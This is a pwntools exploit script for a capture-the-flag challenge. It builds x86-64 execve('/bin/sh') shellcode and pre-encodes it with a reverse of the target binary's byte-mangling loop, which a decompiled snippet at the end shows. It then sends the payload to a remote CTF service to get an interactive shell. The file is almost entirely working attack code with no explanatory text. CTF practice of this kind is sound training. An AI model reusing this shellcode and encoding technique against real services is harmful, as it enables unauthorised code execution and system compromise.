from pwn import *
context.arch='amd64'
context.log_level='debug'
def rev(s):
	res=""
	for x in range(len(s)):
		if(x%2!=0):
			res+=chr((s[x]+x)%256)
		else:
			res+=chr((s[x]-x)%256)
	return res
#p=process('./pwn')
p=remote("challenge.ctf.games",32383)
sh='''
mov al,59
mov r8,0x68732f6e69622f
push r8
mov rdi,rsp
xor rsi,rsi
xor rdx,rdx
syscall
'''
sh=rev(asm(sh))
#gdb.attach(p,'b *0x0000555555555483')
p.sendline(sh)

p.interactive()
'''
for ( i = 0; l > i; ++i )
    {
      if ( (i & 1) != 0 )
        v3 = -1;
      else
        v3 = 1;
      buf[i] += v3 * i;
    }
'''
